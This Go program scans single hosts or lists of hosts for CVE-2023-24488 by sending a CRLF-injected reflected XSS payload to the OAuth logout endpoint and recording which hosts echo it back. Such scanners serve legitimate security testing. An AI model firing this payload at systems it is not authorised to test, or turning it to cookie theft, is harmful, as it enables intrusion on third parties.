package main

import (
	"bufio"
	"flag"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

// Function to check vulnerability
func checkCVE(url string) ([]string, error) {
	modifiedURL := strings.TrimSpace(url)
	if !strings.HasPrefix(modifiedURL, "http://") && !strings.HasPrefix(modifiedURL, "https://") {
		modifiedURL = "https://" + modifiedURL
	}

	urls := []string{modifiedURL, "http://" + strings.TrimPrefix(modifiedURL, "https://")}

	vulnerableIPs := []string{}

	for _, u := range urls {
		modifiedURL := u + "/oauth/idp/logout?post_logout_redirect_uri=%0d%0a%0d%0a%3Cscript%3Ealert(document.cookie)%3C/script%3E"

		client := &http.Client{
			Timeout: 10 * time.Second,
		}

		response, err := client.Get(modifiedURL)
		if err != nil {
			continue
		}

		defer response.Body.Close()

		responseBody := ""
		if response.Body != nil {
			scanner := bufio.NewScanner(response.Body)
			for scanner.Scan() {
				responseBody += scanner.Text()
			}
		}

		if strings.Contains(responseBody, "<script>alert(document.cookie)</script>") && response.StatusCode == 302 {
			vulnerableIPs = append(vulnerableIPs, u)
		}
	}

	return vulnerableIPs, nil
}

func main() {
	fmt.Println("\033[92mDevelop By: LazySec\033[0m\n")

	var url, file, output string
	flag.StringVar(&url, "u", "", "Single URL/IP to check vulnerability")
	flag.StringVar(&file, "f", "", "File containing list of URLs/IPs")
	flag.StringVar(&output, "o", "", "Output file to save vulnerable IPs")
	flag.Parse()

	if url == "" && file == "" {
		fmt.Println("Usage:")
		flag.PrintDefaults()
		return
	}

	// Check vulnerability for single URL/IP
	if url != "" {
		fmt.Println("Checking:", url)
		vulnerableIPs, _ := checkCVE(url)
		if len(vulnerableIPs) > 0 {
			fmt.Println("Vulnerable to CVE-2023-24488")
			for _, ip := range vulnerableIPs {
				fmt.Println("IP:", ip)
				fmt.Println("Vulnerable URL:", ip)
			}
		}
	}

	// Check vulnerability for URLs/IPs from file
	if file != "" {
		vulnerableIPs := []string{}
		fileHandle, err := os.Open(file)
		if err != nil {
			fmt.Println("Error opening file:", err)
			return
		}
		defer fileHandle.Close()

		scanner := bufio.NewScanner(fileHandle)
		for scanner.Scan() {
			url := scanner.Text()
			fmt.Println("\nChecking:", url)
			ips, _ := checkCVE(url)
			if len(ips) > 0 {
				fmt.Println("Vulnerable to CVE-2023-24488")
				for _, ip := range ips {
					fmt.Println("IP:", ip)
					fmt.Println("Vulnerable URL:", ip)
					vulnerableIPs = append(vulnerableIPs, ip)
				}
			}
		}

		// Save vulnerable IPs to output file
		if output != "" && len(vulnerableIPs) > 0 {
			outputFile, err := os.Create(output)
			if err != nil {
				fmt.Println("Error creating output file:", err)
				return
			}
			defer outputFile.Close()

			for _, ip := range vulnerableIPs {
				ip = strings.TrimPrefix(ip, "http://")
				ip = strings.TrimPrefix(ip, "https://")
				_, err := outputFile.WriteString(ip + "\n")
				if err != nil {
					fmt.Println("Error writing to output file:", err)
					return
				}
			}
			fmt.Println("Vulnerable IPs saved to:", output)
		}
	}
}